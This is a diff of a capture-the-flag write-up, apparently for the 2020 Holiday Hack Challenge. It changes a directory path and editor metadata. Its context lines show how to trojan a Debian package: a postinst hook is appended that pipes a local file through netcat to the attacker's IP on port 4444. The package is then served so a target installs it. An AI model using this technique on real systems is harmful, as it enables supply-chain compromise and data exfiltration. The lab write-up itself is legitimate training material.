@@ -38,7 +38,7 @@ an interactive reverse shell can be acquired.
 
 The snippet below automatically inserts the correct IP address of the local host and places the package in the right location of the web tree:
 ```
-cd debs
+cd ~/debs
 mkdir tmp
 dpkg-deb -R netcat-traditional_1.10-41.1ubuntu1_amd64.deb tmp
 echo /bin/nc `ifconfig eth0 | grep 'inet ' | awk '{print $2}'`' 4444 < /NORTH_POLE_Land_Use_Board_Meeting_Minutes.txt' >> tmp/DEBIAN/postinst
@@ -52,9 +52,9 @@ That way the remote device would download this package and install it. In course
 to receive the [text](https://github.com/joergschwarzwaelder/hhc2020/blob/master/Objective-9/NORTH_POLE_Land_Use_Board_Meeting_Minutes.txt) (resp. receive the reverse shell connection).
 In this file it can be found that **Tanta Kringle** recused herself from the vote.
 <!--stackedit_data:
-eyJoaXN0b3J5IjpbLTc5NTY0ODQ1MywxMjcyNjU2NDE5LDg1OD
-E4ODkyOSwxMDkyNzg1MzIxLC0yMDYyNjc1Mjk3LC02MTI4OTc3
-OTksLTg1MjcyMjcwMywxNzU4MjQzNjc3LDE2MzQzOTQ5NDEsMT
-IwNDQyNjUzOSwtMTc5ODQxNTg5NiwtODc4MzkyMjE2LDUxNDIw
-OTE1OV19
+eyJoaXN0b3J5IjpbMjY4NjUzNDg0LDEyNzI2NTY0MTksODU4MT
+g4OTI5LDEwOTI3ODUzMjEsLTIwNjI2NzUyOTcsLTYxMjg5Nzc5
+OSwtODUyNzIyNzAzLDE3NTgyNDM2NzcsMTYzNDM5NDk0MSwxMj
+A0NDI2NTM5LC0xNzk4NDE1ODk2LC04NzgzOTIyMTYsNTE0MjA5
+MTU5XX0=
 -->
